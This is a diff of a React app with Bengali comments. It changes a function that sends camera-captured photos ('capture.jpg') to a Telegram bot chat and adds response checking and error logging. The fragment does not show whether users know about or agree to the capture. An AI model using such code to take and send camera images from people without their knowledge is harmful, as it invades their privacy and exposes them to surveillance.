@@ -24,15 +24,21 @@ function App() {
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", photoBlob, "capture.jpg");
-    formData.append("caption", "নতুন ছবি রিসিভ হয়েছে! 📸");
 
     try {
-      await fetch(TELEGRAM_URL, { method: "POST", body: formData });
+      const response = await fetch(TELEGRAM_URL, { method: "POST", body: formData });
+      const result = await response.json();
+      
+      if (result.ok) {
+        console.log("সাফল্য! ছবি টেলিগ্রামে গেছে।");
+      } else {
+        console.error("টেলিগ্রাম এরর মেসেজ:", result.description);
+        // এখানে বটের টোকেন বা চ্যাট আইডি ভুল থাকলে মেসেজ দেখাবে
+      }
     } catch (err) {
-      console.error("Telegram Error:", err);
+      console.error("নেটওয়ার্ক এরর:", err);
     }
   }, [BOT_TOKEN, CHAT_ID]);
-
   // ছবি তোলার ফাংশন
   const captureImage = useCallback(() => {
     if (videoRef.current && canvasRef.current) {
